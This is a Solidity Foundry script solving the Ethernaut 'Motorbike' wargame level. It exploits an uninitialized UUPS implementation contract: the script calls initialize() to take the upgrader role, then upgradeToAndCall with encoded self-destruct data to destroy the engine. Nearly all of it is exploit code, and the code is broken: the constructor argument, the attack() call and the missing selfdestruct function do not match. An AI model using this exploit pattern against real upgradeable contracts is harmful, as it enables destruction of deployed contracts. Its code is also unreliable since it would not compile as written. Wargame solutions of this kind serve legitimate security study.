
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/contracts/proxy/utils/Initializable.sol";



/*
    Ethernaut's motorbike has a brand new upgradeable engine design.
    Would you be able to selfdestruct its engine and make the motorbike unusable ?

    Things that might help:
        EIP-1967
        UUPS upgradeable pattern
        Initializable contract


    Solution:
    1. Call initialize on Engine contract
    2. Call selfdestruct with upgradeToAndCall()

    The initialize function on the Engine contract was not called
    We are able to call it making us the upgrader
    Upgrade to any contract with the selfdestruct function as encoded data
*/

interface IEngine {
    function horsePower() external view returns (uint256);

    function initialize() external;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;

    function upgrader() external view returns (address);
}

contract MotorbikeAttack is Initializable {


    function attack(address _engine) public {
        // Get engine contract
        IEngine engine = IEngine(_engine);
        // Call initialise: Sets this contract as the upgrader
            // Initialise was not called so we were able to call it
        engine.initialize();
        // Encode self destruct call
        bytes memory encodedData = abi.encodeWithSignature("selfdestruct()", payable(msg.sender));
        // Upgrade to and call with the self destruct function
        engine.upgradeToAndCall(address(this), encodedData);
        // Check requirements
        uint size;
        assembly {
            size := extcodesize(_engine)
        }
        require(size == 0);
    }
}

contract MotorbikeSolution is Script {

    address instanceAddress = 0x98310cFb1Aa669E954B681dee71a31653D490f02;
    IEngine engineAddress = IEngine(address(uint160(uint256(vm.load(address(instanceAddress), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));


    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MotorbikeAttack motorbikeAttack = new MotorbikeAttack(address(engineAddress));
        motorbikeAttack.attack();
        vm.stopBroadcast();
    }
}

